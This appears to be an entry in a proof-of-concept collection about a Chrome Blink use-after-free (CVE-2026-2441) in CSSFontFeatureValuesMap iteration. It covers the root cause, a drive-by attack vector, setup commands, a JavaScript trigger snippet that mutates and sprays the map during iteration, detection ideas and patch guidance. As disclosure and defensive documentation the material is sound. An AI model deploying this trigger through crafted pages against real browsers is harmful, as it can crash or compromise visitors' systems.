# Chrome CSSFontFeatureValuesMap Use-After-Free (CVE-2026-2441)

<!-- 
  File: 2026-05-16_chrome-cssfontfeaturevaluesmap-use-after-free.md
  Location: pocs/web/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-16 |
| **Author / Researcher** | huseyinstif |
| **CVE / Advisory** | CVE-2026-2441 |
| **Category** | web |
| **Severity** | High |
| **CVSS Score** | 8.8 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | use-after-free, Chrome, Blink, CSSOM, renderer-rce, unauthenticated, drive-by |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Google Chrome / Chromium-based browsers (Blink CSS engine) |
| **Versions Affected** | Chrome < 145.0.7632.75 (Windows/macOS stable), Chrome < 144.0.7559.75 (Linux stable), Extended Stable < 144.0.7559.177 |
| **Language / Platform** | HTML + JavaScript PoC / Desktop browsers |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2026-2441 is a Blink use-after-free vulnerability in `CSSFontFeatureValuesMap` iteration logic. A crafted web page mutates a `styleset` map while iterating through entries, which can invalidate internal structures and trigger renderer memory safety failure on vulnerable builds. In unpatched versions this can crash the renderer and may enable attacker-controlled code execution in the renderer sandbox as part of a browser exploit chain.

---

## Vulnerability Details

### Root Cause

`FontFeatureValuesMapIterationSource` used a raw pointer to the internal `FontFeatureAliases` HashMap. During iteration, attacker-driven `set()` / `delete()` operations can force HashMap rehashing and free the old storage. Subsequent iterator reads can dereference stale state, resulting in a use-after-free.

### Attack Vector

An attacker hosts a malicious page that defines `@font-feature-values`, obtains `rule.styleset`, and repeatedly mutates the map during iteration (`entries()`, `for...of`, and `requestAnimationFrame`-driven variants). Visiting the page in a vulnerable browser is enough to trigger the bug path.

### Impact

The immediate impact is renderer process crash (`STATUS_ACCESS_VIOLATION`/`SIGSEGV`) and potential renderer-sandbox code execution. In high-end threat scenarios, this can be chained with sandbox escape and privilege escalation vulnerabilities to reach full system compromise.

---

## Environment / Lab Setup

```
OS:          Windows/macOS/Linux test host
Target:      Vulnerable Chrome/Chromium build listed above
Attacker:    Authorized researcher-controlled web content host
Tools:       Chrome/Chromium, local HTTP server (optional)
```

### Setup Steps

```bash
# 1. Clone source repository
git clone --depth=1 https://github.com/huseyinstif/CVE-2026-2441-PoC /tmp/CVE-2026-2441-PoC

# 2. Serve PoC page locally (or open file directly)
cd /tmp/CVE-2026-2441-PoC
python3 -m http.server 8000

# 3. Open in vulnerable browser build
# http://127.0.0.1:8000/poc.html
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Prepare vulnerable browser** — use an authorized lab build below fixed versions.
2. **Load PoC page** — open `poc.html` from this directory.
3. **Trigger iterator invalidation** — let the script run its mutation loops and heap-grooming logic.
4. **Observe behavior** — vulnerable builds may crash renderer with `STATUS_ACCESS_VIOLATION`/`SIGSEGV`; patched builds should complete.

### Exploit Code

> See `poc.html` in this folder.

```javascript
const iterator = map.entries();
while (step < 20) {
  const result = iterator.next();
  if (result.done) break;
  const [key] = result.value;

  map.delete(key);
  for (let i = 0; i < 512; i++) {
    map.set(`spray_${step}_${i}`, [i, i + 1, i + 2]);
  }

  step++;
}
```

### Expected Output

```
Unpatched (vulnerable): renderer crash (e.g., STATUS_ACCESS_VIOLATION / SIGSEGV)
Patched (fixed): script completes without renderer crash
```

---

## Screenshots / Evidence

- `screenshots/` — add authorized lab crash evidence for vulnerable version and successful completion on patched version

---

## Detection & Indicators of Compromise

```
# Host/telemetry indicators:
# - Browser renderer crashes while processing crafted @font-feature-values rules
# - Repeated CSSOM map mutation patterns in malicious pages
# - Endpoint alerts correlated with abnormal Chrome renderer termination
```

**SIEM / IDS Rule (example):**
```
Detect suspicious pages that repeatedly mutate CSSFontFeatureValuesMap
(entries()/for...of) with high-volume key sprays and correlate with
renderer crash telemetry on vulnerable Chrome versions.
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Update Chrome/Chromium to fixed versions (>= 145.0.7632.75 on Windows/macOS stable, >= 144.0.7559.75 on Linux stable) |
| **Workaround** | Restrict use of outdated browser builds in enterprise environments and enforce rapid browser patching |
| **Config Hardening** | Enable strict browser update policies, isolate high-risk browsing contexts, and monitor renderer crash anomalies |

---

## References

- [CVE-2026-2441 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-2441)
- [Chrome Stable Channel Update (2026-02-13)](https://chromereleases.googleblog.com/2026/02/stable-channel-update-for-desktop_13.html)
- [Source Repository — huseyinstif/CVE-2026-2441-PoC](https://github.com/huseyinstif/CVE-2026-2441-PoC)

---

## Notes

Auto-ingested from https://github.com/huseyinstif/CVE-2026-2441-PoC on 2026-05-16.
